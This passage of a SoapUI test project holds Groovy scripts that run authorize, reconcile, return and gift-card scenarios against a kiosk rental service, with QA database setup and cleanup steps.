tc.setPropertyValue("PurchaseFormats", context.expand( '${DataSource#PurchaseFormats}' ));
tc.setPropertyValue("numOfPurchases", context.expand( '${DataSource#numOfPurchases}' ));
tc.setPropertyValue("SetDaysBack", context.expand( '${DataSource#SetDaysBack}' ));
tc.setPropertyValue("LoyaltyFlag", context.expand( '${DataSource#LoyaltyFlag}' ));
tc.setPropertyValue("UseCredits", '0');//HardCoded to 0 since it there will be no credits in future
tc.setPropertyValue("IsOffline", context.expand( '${DataSource#IsOffline}' ));
tc.setPropertyValue("RentalTaxRate", context.expand( '${#TestCase#RentalTaxRate}' ));
tc.setPropertyValue("PurchaseTaxRate", context.expand( '${#TestCase#PurchaseTaxRate}' ));
tc.setPropertyValue("DigitalPurchaseTaxRate", context.expand( '${#TestCase#DigitalPurchaseTaxRate}' ));
tc.setPropertyValue("CustomerProfileNumber", context.expand( '${#TestCase#CustomerProfileNumber}' ));
tc.setPropertyValue("EnableServiceFee", "false");
tc.setPropertyValue("ServiceFeeTaxRate", context.expand( '${#TestCase#ServiceFeeTaxRate}' ));
tc.setPropertyValue("ServiceFeeAmount", context.expand( '${#TestCase#ServiceFeeAmount}' ));
tc.setPropertyValue("HasUpsell", "false");


//Check how to get the disc price

def runner = tc.run( null, false );
// show that it worked out ok
log.info("Status: $runner.status, time taken for TestCase [Authorize] was: $runner.timeTaken ms");
def tcStatus = (runner.status).toString()
if(tcStatus == "FAILED")
{
	assert runner.status == Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Authorize $tcStatus");
	testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}
else
{
	// assert that it didn't fail
	assert runner.status != Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Authorize $tcStatus");
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}</script></con:config></con:testStep><con:testStep type="manualTestStep" name="Manual" id="769a2a2f-cdfa-4e15-b584-46899e3e84b4" disabled="true"><con:settings/><con:config xsi:type="con:ManualTestStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/></con:testStep><con:testStep type="groovy" name="Reconcile" id="f7bb542a-b492-4475-801a-f4dcbfdbcd0e"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status

def isOffline = context.expand( '${DataSource#IsOffline}' );
//Set properties from Data Source
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Reconcile"];
//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}
tc.setPropertyValue("Email", context.expand( '${DataSource#Email}' ));
tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
tc.setPropertyValue("UseCredits", '0');
tc.setPropertyValue("RentalTaxRate", context.expand( '${#TestCase#RentalTaxRate}' ));
tc.setPropertyValue("PurchaseTaxRate", context.expand( '${#TestCase#PurchaseTaxRate}' ));
tc.setPropertyValue("DigitalPurchaseTaxRate", context.expand( '${#TestCase#DigitalPurchaseTaxRate}' ));
tc.setPropertyValue("RentalVendStatus", context.expand( '${DataSource#RentalVendStatus}' ));
tc.setPropertyValue("PurchaseVendStatus", context.expand( '${DataSource#PurchaseVendStatus}' ));
tc.setPropertyValue("IsOffline", context.expand( '${DataSource#IsOffline}' ));

//Get properties from Authorize test case from test suite Generic Steps (KioskService).
def authtc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Authorize"];
tc.setPropertyValue("PurchaseCount", authtc.getPropertyValue("PurchaseCount"));
tc.setPropertyValue("PurchaseBarcodes", authtc.getPropertyValue("PurchaseBarcodes"));
tc.setPropertyValue("PurchaseTitleIds", authtc.getPropertyValue("PurchaseTitleIds"));
tc.setPropertyValue("PurchaseProductFamily", authtc.getPropertyValue("PurchaseProductFamily"));
tc.setPropertyValue("PurchaseProductType", authtc.getPropertyValue("PurchaseProductType"));
tc.setPropertyValue("PurchaseDiscPrice", authtc.getPropertyValue("PurchaseDiscPrice"));
tc.setPropertyValue("RentalCount", authtc.getPropertyValue("RentalCount"));
tc.setPropertyValue("RentalBarcodes", authtc.getPropertyValue("RentalBarcodes"));
tc.setPropertyValue("RentalTitleIds", authtc.getPropertyValue("RentalTitleIds"));
tc.setPropertyValue("RentalProductFamily", authtc.getPropertyValue("RentalProductFamily"));
tc.setPropertyValue("RentalProductType", authtc.getPropertyValue("RentalProductType"));
tc.setPropertyValue("RentalDiscPrice", authtc.getPropertyValue("RentalDiscPrice"));
tc.setPropertyValue("RentalNonReturnPrice", authtc.getPropertyValue("RentalNonReturnPrice"));
tc.setPropertyValue("RentalNonReturnDays", authtc.getPropertyValue("RentalNonReturnDays"));
tc.setPropertyValue("HasPhysicalPurchase", authtc.getPropertyValue("HasPhysicalPurchase"));
tc.setPropertyValue("DiscountPayload", authtc.getPropertyValue("DiscountPayload"));
tc.setPropertyValue("CCPayload", authtc.getPropertyValue("CCPayload"));
tc.setPropertyValue("PromoCode", authtc.getPropertyValue("PromoCode"));
tc.setPropertyValue("PromoValue", authtc.getPropertyValue("PromoValue"));
tc.setPropertyValue("DiscountAmountList", authtc.getPropertyValue("DiscountAmountList")); //PROMO
tc.setPropertyValue("CustomerProfileNumber", authtc.getPropertyValue("CustomerProfileNumber"));
tc.setPropertyValue("EstimatedLoyaltyAmount", authtc.getPropertyValue("EstimatedLoyaltyAmount"));
tc.setPropertyValue("HasLoyaltyDiscount", authtc.getPropertyValue("HasLoyaltyDiscount"));
tc.setPropertyValue("HasPromoDiscount", authtc.getPropertyValue("HasPromoDiscount"));
tc.setPropertyValue("EnableServiceFee", authtc.getPropertyValue("EnableServiceFee"));
tc.setPropertyValue("HasUpsell",authtc.getPropertyValue("HasUpsell"));
tc.setPropertyValue("ServiceFeePayload", authtc.getPropertyValue("ServiceFeePayload"));

if (isOffline == 'true')
{
	//For Offline set the values to NULL
	tc.setPropertyValue("TransactionID", "null");
	tc.setPropertyValue("InvoiceID", "");
}
else
{
	tc.setPropertyValue("TransactionID", authtc.getPropertyValue("TransactionID"));
	tc.setPropertyValue("InvoiceID", authtc.getPropertyValue("InvoiceID"));
}

//tc.setPropertyValue("IsOffline", "false"); //hardCoded for time being.

def runner = tc.run( null, false );
// show that it worked out ok
log.info("Status: $runner.status, time taken for TestCase [Reconcile] was: $runner.timeTaken ms");
def tcStatus = (runner.status).toString()
if(tcStatus == "FAILED")
{
	assert runner.status == Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Reconcile $tcStatus");
	testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}
else
{
	// assert that it didn't fail
	assert runner.status != Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Reconcile $tcStatus");
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}</script></con:config></con:testStep><con:testStep type="manualTestStep" name="Manual 2" id="b7490796-8bd0-43cd-860c-b2b818572f8a"><con:settings/><con:config xsi:type="con:ManualTestStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/></con:testStep><con:testStep type="groovy" name="Return" id="178ac2a2-9b13-4308-b12e-3c766b385ce9"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
//get the Return Test case
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Return"];
def reconciletc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Reconcile"];
//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}
def vendedBarcodes = reconciletc.getPropertyValue("VendedRentalBarcodes");
//def testreturnTYpe = '6,6,6';
//def testFailedSecurityRead = 'False,False,False'
def TransactionID = reconciletc.getPropertyValue("TransactionID");
def CardType = reconciletc.getPropertyValue("CardType");
def InvoiceID = reconciletc.getPropertyValue("InvoiceID");
def IsOffline = reconciletc.getPropertyValue("IsOffline");
def RentalCount = reconciletc.getPropertyValue("VendedRentalsCount");
def PurchaseCount = reconciletc.getPropertyValue("VendedPurchaseCount");
def setDaysBack = Eval.me("[" + context.expand('${DataSource#SetDaysBack}') + "]");
def customerProfileNumber = context.expand( '${#TestCase#CustomerProfileNumber}' );
log.info ("setDaysBack:$setDaysBack; vendedBarcodes:$vendedBarcodes");
vendedBarcodesList = vendedBarcodes.split(",");
//testreturnTypeList = testreturnTYpe.split(",");
//testFailedSecurityReadList = testFailedSecurityRead.split(",");
//Added this logic to avoid bad data in datasource; test case failure due to bad data
if (vendedBarcodesList.size() != setDaysBack.size())
{
	def difference = (vendedBarcodesList.size() - setDaysBack.size())
     for (i = 0; i &lt; difference; i++)
     {
     	setDaysBack.add('0') //if the size is different add the default to 0
     }
}
else
{
     //nothing to do, code/data looks good
}
def setDaysBackList = setDaysBack.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");
//Call Return Step in for loop based on number of barcodes.
if (vendedBarcodes == "")
{
	log.info ("No Return is required");
	testRunner.gotoStepByName("DataSource Loop");
}
else
{
	for (r = 0; r &lt; vendedBarcodesList.size(); r++)
	{				
		curvendedBarcodes = vendedBarcodesList[r].toString().trim();
		cursetDaysBack = setDaysBackList[r].toString().trim()
		log.info ("SetDaysBack:$cursetDaysBack ;Barcode:$curvendedBarcodes");

		//ReturnType = testreturnTypeList[r].toString().trim();
		//FailedSecurityRead = testFailedSecurityReadList[r].toString().trim();
	
		tc.setPropertyValue("Barcode", curvendedBarcodes);
		tc.setPropertyValue("SetDaysBack", cursetDaysBack);
		tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
		//tc.setPropertyValue("KioskID", '1529');
		//tc.setPropertyValue("KioskID", '1515'); //to check the return on different kiosk
		tc.setPropertyValue("TransactionID", TransactionID);
		tc.setPropertyValue("ReturnType", '6' );
		tc.setPropertyValue("FailedSecurityRead", 'False' );
		//tc.setPropertyValue("ReturnType", ReturnType.toString() );
		//tc.setPropertyValue("FailedSecurityRead", FailedSecurityRead.toString() );
		tc.setPropertyValue("CustomerProfileNumber", customerProfileNumber );
		tc.setPropertyValue("CardType", CardType);
		tc.setPropertyValue("InvoiceID", InvoiceID);
		tc.setPropertyValue("IsOffline", IsOffline);
		tc.setPropertyValue("RentalCount", RentalCount);
		tc.setPropertyValue("PurchaseCount", PurchaseCount);
	
		def runner = tc.run( null, false );
		// show that it worked out ok
		log.info("Status: $runner.status, time taken for TestCase [Return] was: $runner.timeTaken ms");
		def tcStatus = (runner.status).toString()
	//	assert runner.status != Status.FAILED : runner.reason
	
		if(tcStatus == "FAILED")
		{
			assert runner.status == Status.FAILED : runner.reason
			testRunner.testCase.setPropertyValue("TestCaseStatus","Return $tcStatus");
			testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
		}
		else
		{
			// assert that it didn't fail
			assert runner.status != Status.FAILED : runner.reason
			testRunner.testCase.setPropertyValue("TestCaseStatus","Return $tcStatus");
			testRunner.gotoStepByName("DataSource Loop");
		}
	
	}
}</script></con:config></con:testStep><con:testStep type="datasink" name="SaveResults" id="500f1963-922d-4256-ac9d-54a132fd60f9" disabled="true"><con:settings/><con:config xsi:type="con:DataSinkStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dataSink type="File"><con:configuration><fileName>${projectDir}/Test_Results.txt</fileName><separator>:</separator><escape>"</escape><quote>false</quote><trim>true</trim><append>false</append><encoding>Cp1252</encoding></con:configuration></con:dataSink><con:properties><con:property><con:name>Number</con:name><con:value>${#TestCase#ScenarioNo}</con:value></con:property><con:property><con:name>Scenario</con:name><con:value>${DataSource#Scenario}</con:value></con:property><con:property><con:name>TransactionId</con:name><con:value>${#TestCase#TransactionId}</con:value></con:property><con:property><con:name>Status</con:name><con:value>${#TestCase#TestCaseStatus}</con:value></con:property><con:property><con:name>Date</con:name><con:value>${=new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date())}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="datasourceloop" name="DataSource Loop" id="5be1f2a3-29d5-4849-812f-1dfb6ba55bfc" disabled="true"><con:settings/><con:config><dataSourceStep>DataSource</dataSourceStep><targetStep>Get Data</targetStep></con:config></con:testStep><con:setupScript>testRunner.testCase.setPropertyValue("StartTime", new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date()));
log.info("/###########################START###########################/");
log.info("Test Case Name : " + context.testCase.name);
log.info("/###########################START###########################/");
//Cleanup Script
log.info("Cleaning up any open transactions from previous executions...");
import com.eviware.soapui.model.testsuite.TestRunner.Status
import groovy.json.JsonSlurper
import groovy.sql.Sql
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");
def rbConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName("RedboxServerDB");
def rbconstring = rbConObj.getConnectionString();
log.info ("#########################################################################################")
def msConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('MerchantService');
def msconstring = msConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(rbconstring);
def mssql = Sql.newInstance(msconstring);

//Disable batching job.
mssql.execute("EXEC msdb.dbo.sp_update_job @job_name='CreateBatchItemsAndBatches',@enabled = 0");
log.info ("Batch Job is disabled");

log.info("...cleaning up transactions");
sql.eachRow("SELECT t.transaction_id FROM [Transaction] t INNER JOIN disc_transaction dt ON t.transaction_id = dt.transaction_id WHERE t.customer_id in (19799) AND dt.Transaction_Type = 1  AND t.Transaction_Status = 4 AND ((dt.DiscTransaction_Status = 2) OR ( dt.DiscTransaction_Status = 4 AND t.ChargeDate IS NOT NULL AND (ApprovalCode IS NULL OR ApprovalCode = '')))"){
//for each transaction id remove disc transaction, transaction and customer disc etc
	row ->
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM TransactionDiscount WHERE TransactionId = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM disc_transaction WHERE transaction_id = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM unplayablereturnhistory WHERE transactionid = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM [TRANSACTION] WHERE TRANSACTION_ID = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM CustomerTransaction WHERE TransactionID = ${row.Transaction_Id}"))
}


log.info("...cleaning up barcodes");
//reset the disc statuses to 'in kiosk'
log.info("Number of customer disc deleted: " + sql.executeUpdate("DELETE FROM CustomerDisc WHERE CustomerId in (19799)"))
//sql.executeUpdate("UPDATE disc SET physical_status = 2 Where Title_ID in (Select Title_ID from Title WHere [FormatId] = 17) and KioskClient_ID = 1505")
sql.executeUpdate("UPDATE disc SET physical_status = 2 Where KioskClient_ID = 1505")</con:setupScript><con:tearDownScript>import groovy.json.JsonSlurper
import groovy.sql.Sql
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");
def msConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('MerchantService');
def msconstring = msConObj.getConnectionString();
//Define the Connection
def mssql = Sql.newInstance(msconstring);
//Enable batching job.
mssql.execute("EXEC msdb.dbo.sp_update_job @job_name='CreateBatchItemsAndBatches',@enabled = 1");
log.info ("Batch Job is Enabled");

log.info("/###########################END###########################/");
log.info("Test Case Name : " + context.testCase.name + "Test Case Status : " + testRunner.getStatus());
log.info ("Time Taken: ${((testRunner.timeTaken)/1000)/60} mins");
log.info("/###########################END###########################/");
testRunner.testCase.setPropertyValue("EndTime", new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date()));</con:tearDownScript><con:properties><con:property><con:name>TransactionID</con:name><con:value>1780829</con:value></con:property><con:property><con:name>InvoiceID</con:name><con:value>2148847309</con:value></con:property><con:property><con:name>CustomerProfileNumber</con:name><con:value xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">90284864596698</con:value></con:property><con:property><con:name>RentalTaxRate</con:name><con:value>9.7500</con:value></con:property><con:property><con:name>PurchaseTaxRate</con:name><con:value>8.0000</con:value></con:property><con:property><con:name>DigitalPurchaseTaxRate</con:name><con:value>0.0000</con:value></con:property><con:property><con:name>ServiceFeeTaxRate</con:name><con:value>9.9500</con:value></con:property><con:property><con:name>TestCaseStatus</con:name><con:value>Return PASS</con:value></con:property><con:property><con:name>ScenarioNo</con:name><con:value/></con:property><con:property><con:name>StartTime</con:name><con:value>06/21/18-11:25:44.293</con:value></con:property><con:property><con:name>EndTime</con:name><con:value>06/21/18-11:25:53.467</con:value></con:property><con:property><con:name>ServiceFeeAmount</con:name><con:value>0.0900</con:value></con:property></con:properties><con:reportParameters/><con:breakPoints><con:testStepId>6873cb8c-7751-4904-9fc0-ed152c6ef0c6</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>d498c61d-c9fd-48e5-baf1-1503a4a1b824</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>275f8372-53c8-49f3-807b-3f64816f3d89</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>3b329060-a4aa-4532-9611-e37bcd9a11c3</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>f9658b22-7814-4f47-af67-f42efbd6c101</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>ef30018b-951d-43d4-95b1-5f1c3248c5b1</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>b3b7c784-7c50-42e4-b75d-8e6f746e026c</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>347bcb1b-704d-4b55-82ea-8c570a159ab9</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints></con:testCase><con:testCase id="0f05739d-1189-495b-ae99-b75c9fcda9a2" discardOkResults="true" failOnError="false" failTestCaseOnErrors="true" keepSession="false" name="GiftCard-ROP" searchProperties="true" timeout="0" wsrmEnabled="false" wsrmVersion="1.0" wsrmAckTo="" amfAuthorisation="false" amfEndpoint="" amfLogin="" amfPassword="" maxResults="0" disabled="true"><con:description>Currently Out Of Scope for this one. </con:description><con:settings><con:setting id="IncludeOverview">true</con:setting><con:setting id="IncludeResults">true</con:setting><con:setting id="FlowLayout">false</con:setting><con:setting id="ErrorDetails">true</con:setting><con:setting id="IncludeCoverage">true</con:setting></con:settings><con:testStep type="jdbc" name="WarmUp Script" id="fc7c26e9-944d-46a0-a565-c35e940bd65b"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>Select GetDate() AS CurrentDateTime</con:query><con:properties/></con:config></con:testStep><con:testStep type="datasource" name="DataSource" id="09159363-ecda-42e1-a4d4-747dab2afb8a"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.teststeps.datasource.DataSourceContainer@prepared-properties">&lt;xml-fragment/></con:setting></con:settings><con:config xsi:type="con:DataSourceStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dataSource type="JDBC"><con:configuration><driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</driver><connstr>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=QaAutomation;integratedSecurity=true;</connstr><pass>t</pass><Connection>QaAutomation( Default environment )</Connection><query>Select 
	KS_ROP.ID As ID, 
	KS_ROP.Scenario As Scenario, 
	KS_ROP.Email As Email,
	KS_ROP.CreditCardNumber As Ccnumber, 
	KS_ROP.CreditCardType As CCType, 
	KS_ROP.PromoCode As PromoCode, 
	KS_ROP.PromoValue As PromoValue, 
	KS_ROP.KioskID As KioskID,   
	KS_ROP.RentalFormats As rentalFormats, 
	KS_ROP.NumberOfRentals As numOfRentals, 
	KS_ROP.RentalVendStatus As RentalVendStatus,  
	KS_ROP.PurchaseFormats As PurchaseFormats, 
	KS_ROP.NumberOfPurchases As numOfPurchases, 
	KS_ROP.PurchaseVendStatus As PurchaseVendStatus,  
	KS_ROP.SetDaysBack As SetDaysBack, 
	KS_ROP.RecoFormats As recoFormats,  
	KS_ROP.NumOfRecos As numOfRecos, 
	KS_ROP.RecoVendStatus As RecoVendStatus,
	KS_ROP.TSPFlag As TSPFlag,
	KS_ROP.GCPin As GCPin
From KS_ROP
Where
	KS_ROP.TestCaseName = 'GiftCard-ROP'</query><fetchSize/><stored-procedure>false</stored-procedure></con:configuration></con:dataSource><con:property>ID</con:property><con:property>Scenario</con:property><con:property>Email</con:property><con:property>Ccnumber</con:property><con:property>CCType</con:property><con:property>PromoCode</con:property><con:property>PromoValue</con:property><con:property>KioskID</con:property><con:property>rentalFormats</con:property><con:property>numOfRentals</con:property><con:property>RentalVendStatus</con:property><con:property>PurchaseFormats</con:property><con:property>numOfPurchases</con:property><con:property>PurchaseVendStatus</con:property><con:property>SetDaysBack</con:property><con:property>recoFormats</con:property><con:property>numOfRecos</con:property><con:property>RecoVendStatus</con:property><con:property>TSPFlag</con:property><con:property>GCPin</con:property><con:completeLastOperation>true</con:completeLastOperation><con:restartOnRun>true</con:restartOnRun></con:config></con:testStep><con:testStep type="groovy" name="Get Data" id="0d3e95e9-06e5-4eae-82ca-1687923cda14"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
def ScenarioNo =  context.expand( '${DataSource#ID}' );
testRunner.testCase.setPropertyValue("ScenarioNo", ScenarioNo.toString())
log.info ("--------------------------------" + context.testCase.name + "------------------------------");
log.info ("Scenario [$ScenarioNo]:Kiosk " + context.expand( '${DataSource#Scenario}' ));
log.info ("------------------------------START----------------------------------");

//Get Data from Data Source
def ccNumber = context.expand( '${DataSource#Ccnumber}' );
def kioskID = context.expand( '${DataSource#KioskID}' );
def UseCredits = '0'; //Default to ); since credits will be disabled after Loyality is ON
def IsOffline = context.expand( '${DataSource#IsOffline}' );
def GCPin = context.expand( '${DataSource#GCPin}' );

//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);

//Get TaxRate for the Kiosk.
def taxDetails = sql.firstRow("Select Sales_Tax_Rate, PurchaseTaxRate, DigitalPurchaseTaxRate, ServiceFeeTaxRate,ServiceFee  from KioskClient Where KioskClient_Id = $kioskID");
def rentalTaxRate = (taxDetails.Sales_Tax_Rate);
def purchaseTaxRate = (taxDetails.PurchaseTaxRate);
def digitalPurchaseTaxRate = (taxDetails.DigitalPurchaseTaxRate);
def serviceFeeTaxRate = (taxDetails.ServiceFeeTaxRate)!= null ? (taxDetails.ServiceFeeTaxRate) : "0.0000";
def serviceFeeAmount = (taxDetails.ServiceFee)!= null ? (taxDetails.ServiceFee) : "0.0000";

log.info ("KioskID:$kioskID; RentalTaxRate:$rentalTaxRate; PurchaseTaxRate:$purchaseTaxRate; DigitalPurchaseTaxRate:$digitalPurchaseTaxRate; ServiceFeeTaxRate:$serviceFeeTaxRate");
//Save Tax Rate at property level
testRunner.testCase.setPropertyValue('RentalTaxRate',rentalTaxRate.toString());
testRunner.testCase.setPropertyValue('PurchaseTaxRate',purchaseTaxRate.toString());
testRunner.testCase.setPropertyValue('DigitalPurchaseTaxRate',digitalPurchaseTaxRate.toString());
testRunner.testCase.setPropertyValue('ServiceFeeTaxRate',serviceFeeTaxRate.toString());
testRunner.testCase.setPropertyValue('ServiceFeeAmount',serviceFeeAmount.toString());

//Get Encrypted CC Info using Merchant Service method.
def encryptCC = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Generate Encrypted CCInfo"];
encryptCC.setPropertyValue("CardNumber", ccNumber);
encryptCC.setPropertyValue("KeyID", context.expand( '${#Project#KeyId}' ));

def ccrunner = encryptCC.run( null, false );	
// show that it worked out ok
log.info("Status: $ccrunner.status, time taken for TestCase was: $ccrunner.timeTaken ms");
// assert that it didn't fail
assert ccrunner.status != Status.FAILED : ccrunner.reason


//Get CustomerProfile Info.
def getCP = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Get Customer Info From Encrypted CC"];
getCP.setPropertyValue("CardHashId",encryptCC.getPropertyValue("CardID"));
def getCPrunner = getCP.run( null, false );	
// show that it worked out ok
log.info("Status: $getCPrunner.status, time taken for TestCase was: $getCPrunner.timeTaken ms");
// assert that it didn't fail
assert getCPrunner.status != Status.FAILED : getCPrunner.reason

//Get CustomerProfileNumber
def CustomerProfileNumber = getCP.getPropertyValue("CpCustomerNumber");
testRunner.testCase.setPropertyValue("CustomerProfileNumber",CustomerProfileNumber);
def CustomerID = getCP.getPropertyValue("CustomerId");
def CardAccountID = getCP.getPropertyValue("CardAccountId");
//Deleting the records from CustomerDisc to avoid below error
//Found an existing CustomerDisc record for disc: XXXXX, matching customer: XXXXXX!  Echo message, rolling back reconcile
log.info("Number of customerdisc records deleted: " + sql.executeUpdate("DELETE FROM CustomerDisc WHERE CustomerId in ($CustomerID)"));

//Clear Open Rental and Reservations
def runCleanCustomer = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Cleanup Open Transactions"];
runCleanCustomer.setPropertyValue("CustomerId",CustomerID);
runCleanCustomer.setPropertyValue("kioskID",kioskID);
def CleanCustomerrunner = runCleanCustomer.run( null, false );	
// show that it worked out ok
log.info("Status: $CleanCustomerrunner.status, time taken for TestCase [Cleanup Open Transactions] was: $CleanCustomerrunner.timeTaken ms");
// assert that it didn't fail
assert CleanCustomerrunner.status != Status.FAILED : CleanCustomerrunner.reason

//Create Credits.
if (CustomerProfileNumber != "" &amp;&amp; UseCredits == '2' &amp;&amp; IsOffline != "true")
{
	def generateCredits = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Set Up Credits"];
	generateCredits.setPropertyValue("CpCustomerNumber",CustomerProfileNumber);
	generateCredits.setPropertyValue("DVDCreditQty",context.expand( '${DataSource#DVDCredits}' ));
	generateCredits.setPropertyValue("MovieCreditQty",context.expand( '${DataSource#MovieCredits}' ));
	generateCredits.setPropertyValue("GameCreditQty",context.expand( '${DataSource#GameCredits}' ));

	def generateCreditsrunner = generateCredits.run( null, false );	
	// show that it worked out ok
	log.info("Status: $generateCreditsrunner.status, time taken for TestCase was: $generateCreditsrunner.timeTaken ms");
	// assert that it didn't fail
	assert generateCreditsrunner.status != Status.FAILED : generateCreditsrunner.reason

	log.info ("Successfully Created Credits");
}
else
{
	log.info ("No credits required for the testCase or CustomerProfileNumber is NULL");
}

//Reload GiftCard
def reloadTC = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["ReloadGiftCard"];

for(int j=0;j&lt;reloadTC.getPropertyCount();j++)
{
  reloadTC.getPropertyAt(j).setValue("");
}

reloadTC.setPropertyValue("CardAccountID",CardAccountID.toString());
reloadTC.setPropertyValue("CardExists",'1');
reloadTC.setPropertyValue("CardNumber",ccNumber.toString());
reloadTC.setPropertyValue("GCPin",GCPin.toString());
def reloadTCrunner = reloadTC.run( null, false );	
// show that it worked out ok
log.info("Status: $reloadTCrunner.status, time taken for TestCase [ReloadGiftCard] was: $reloadTCrunner.timeTaken ms");
// assert that it didn't fail
assert reloadTCrunner.status != Status.FAILED : reloadTCrunner.reason

</script></con:config></con:testStep><con:testStep type="groovy" name="Authorize" id="6696c501-3dd6-43ee-91d7-8c3d7aaaa1b3"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["GCAuthorize"];
//Cleaning up the properties; set the values to NULL before the start

for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}
tc.setPropertyValue("Email", context.expand( '${DataSource#Email}' ));
tc.setPropertyValue("CCNumber", context.expand( '${DataSource#Ccnumber}' ));
tc.setPropertyValue("CCType", context.expand( '${DataSource#CCType}' ));
tc.setPropertyValue("PromoCode", context.expand( '${DataSource#PromoCode}' ));
tc.setPropertyValue("PromoValue", context.expand( '${DataSource#PromoValue}' ));
tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
tc.setPropertyValue("rentalFormats", context.expand( '${DataSource#rentalFormats}' ));
tc.setPropertyValue("numOfRentals", context.expand( '${DataSource#numOfRentals}' ));
tc.setPropertyValue("PurchaseFormats", context.expand( '${DataSource#PurchaseFormats}' ));
